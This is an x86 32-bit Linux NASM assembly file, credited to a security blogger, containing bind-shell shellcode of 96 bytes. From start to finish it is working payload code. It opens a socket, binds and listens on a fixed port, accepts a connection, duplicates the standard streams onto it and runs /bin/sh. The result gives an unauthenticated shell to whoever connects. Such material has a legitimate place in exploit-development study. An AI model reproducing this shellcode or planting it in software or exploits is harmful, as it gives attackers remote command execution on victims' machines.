; Filename:    bind-shell.nasm
; Author:      Joshua Arnold
; Website:     https://huskersec.com
;
;
; Purpose:     Creates a bind shell on a local system
; Explanation:      
; number of bytes: original 114; now 96
; Version: 1.0
;

BITS 32
global _start			

section .text
_start:

        ;zeroing out ebx, eax and edx - because mul acts on eax and edx
        xor ebx,ebx
        mul ebx

	; server=socket(2,1,0)
	push eax
	push byte 0x1
	push byte 0x2
	mov ecx,esp
	inc ebx
	mov al,0x66
	int 0x80
	mov esi,eax

	; bind(server, (struct sockaddr *)&serv_addr,0x10)
	push edx
	push edx
	push word 0xcdab ;port specification
        push word 0x2
        mov ecx,esp
	push byte 16
	push ecx
	push esi
	mov ecx,esp
	inc ebx
	mov al,0x66
	int 0x80

	; listen(server, 0)
	push edx
	push esi
	mov ecx,esp
	mov bl,0x4
	mov al,0x66
	int 0x80

	; client=accept(server, 0, 0)
	push edx
	push edx
	push esi
	mov ecx,esp
	inc bl
	mov al,0x66	
	int 0x80

	; dup2() setup
	xor ecx,ecx
	mov ebx,eax

        ; dup2 repetition
        mov cl,0x3
        dup2:
        dec cl
        mov al,0x3f
        int 0x80
        jne dup2


	; execve "/bin/sh"
	push edx
	push long 0x68732f2f
	push long 0x6e69622f
	mov ebx,esp
	push edx
	push ebx
	mov ecx,esp
	mov al,0x0b
	int 0x80

